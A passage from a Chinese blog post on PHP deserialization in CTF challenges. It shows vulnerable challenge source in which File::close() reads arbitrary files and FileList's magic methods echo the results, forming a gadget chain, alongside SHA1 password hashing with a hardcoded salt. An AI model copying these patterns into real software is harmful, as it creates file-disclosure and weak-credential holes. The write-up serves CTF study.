<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">bind_param</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"ss"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">execute</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">verify_user</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (!</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">user_exist</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"SiAchGHmFx"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">db</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">prepare</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">SELECT</span><span style="color:#ce9178"> `password` </span><span style="color:#569cd6">FROM</span><span style="color:#ce9178"> `users` </span><span style="color:#569cd6">WHERE</span><span style="color:#ce9178"> `username` </span><span style="color:#d4d4d4">=</span><span style="color:#ce9178"> ?;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">bind_param</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"s"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">execute</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">bind_result</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$expect</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">fetch</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$expect</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#9cdcfe">$expect</span><span style="color:#d4d4d4"> === </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">db</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">close</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">FileList</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$files</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$results</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$funcs</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$path</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">files</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">results</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">funcs</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">scandir</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$path</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array_search</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"."</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">unset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array_search</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">".."</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">unset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$filenames</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">File</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">open</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$path</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">array_push</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">files</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">results</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">name</span><span style="color:#d4d4d4">()] = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__call</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$args</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">array_push</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">funcs</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">files</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">results</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">name</span><span style="color:#d4d4d4">()][</span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">] = </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;thead&gt;&lt;tr&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">funcs</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;th scope="col" class="text-center"&gt;'</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">htmlentities</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;/th&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;/thead&gt;&lt;tbody&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">results</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;tr&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">foreach</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$result</span><span style="color:#d4d4d4"> as </span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4"> =&gt; </span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;td class="text-center"&gt;'</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">htmlentities</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;/td&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;td class="text-center" filename="'</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">htmlentities</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.=</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'&lt;/tr&gt;'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$table</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">File</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">open</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">filename</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">file_exists</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) &amp;&amp; !</span><span style="color:#dcdcaa">is_dir</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">name</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">basename</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">size</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">filesize</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$units</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">' B'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">' KB'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">' MB'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">' GB'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">' TB'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4"> &gt;= </span><span style="color:#b5cea8">1024</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">++) </span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4"> /= </span><span style="color:#b5cea8">1024</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">round</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$size</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">)</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$units</span><span style="color:#d4d4d4">[</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">detele</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">unlink</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">close</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fa-circle-user fa-fw fas"></i>文章作者: </span><span class="post-copyright-info"><a href="https://4rozen.github.io/">4rozeN</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fa-fw fa-square-arrow-up-right fas"></i>文章链接: </span><span class="post-copyright-info"><a href="https://4rozen.github.io/posts/91123">https://4rozen.github.io/posts/91123</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fa-circle-exclamation fa-fw fas"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://4rozeN.github.io" target="_blank">林之介 | 4rozeN</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div></div><nav class="pagination-post" id="pagination"><a class="no-desc pagination-related" href="/posts/79216" title="浅略了解团队协作必须的 Git 的使用"><img class="cover" src= "/img/loading/loading.gif" data-lazy-src="https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E9%9A%8F%E6%83%B3%E9%9A%8F%E8%AE%B0/git%E5%AD%A6%E4%B9%A0.webp" onerror="onerror=null,src=&quot;/img/avatar/emo.webp&quot;" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">浅略了解团队协作必须的 Git 的使用</div></div></div></a><a class="no-desc pagination-related" href="/posts/17306" title="使用浏览器爬取 qq 群的用户 qq 号"><img class="cover" src= "/img/loading/loading.gif" data-lazy-src="https://ali-4rozen-oss.oss-cn-guangzhou.aliyuncs.com/blog/cover/%E9%9A%8F%E6%83%B3%E9%9A%8F%E8%AE%B0/js%E7%88%AC%E5%8F%96.webp" onerror="onerror=null,src=&quot;/img/avatar/emo.webp&quot;" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">使用浏览器爬取 qq 群的用户 qq 号</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fa-comments fa-fw fas"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-info card-widget text-center"><div class="avatar-img"><img src= "/img/loading/loading.gif" data-lazy-src="/img/avatar/avatar.jpg" onerror="this.onerror=null,this.src=&quot;/img/avatar/emo.webp&quot;" alt="avatar"></div><div class="author-info-name">4rozeN</div><div class="author-info-description">Coding noob 自进阶</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/rss2.xml" target="_blank" title="RSS"><i class="fa-rss fas" style="color:#f60"></i></a><a class="social-icon" href="https://github.com/4rozeN" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fa-github fab" style="color:#5f6e7c"></i></a><a class="social-icon" href="https://steamcommunity.com/id/430426/" rel="external nofollow noreferrer" target="_blank" title="Steam"><i class="fa-steam fab" style="color:#5f6e7c"></i></a><a class="social-icon" href="mailto:mail4chen@foxmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fa-envelope fas" style="color:#4a7dbe"></i></a></div></div><div class="card-announcement card-widget"><div class="item-headline"><i class="fa-bullhorn fa-shake fas"></i><span>公告</span></div><div class="announcement_content">最近在努力学习Fabric modding和其他内容，不知天地为何物。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fa-stream fas"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text"> php 反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 常用魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize"><span class="toc-number">3.1.</span> <span class="toc-text"> [SWPUCTF 2021 新生赛] ez_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 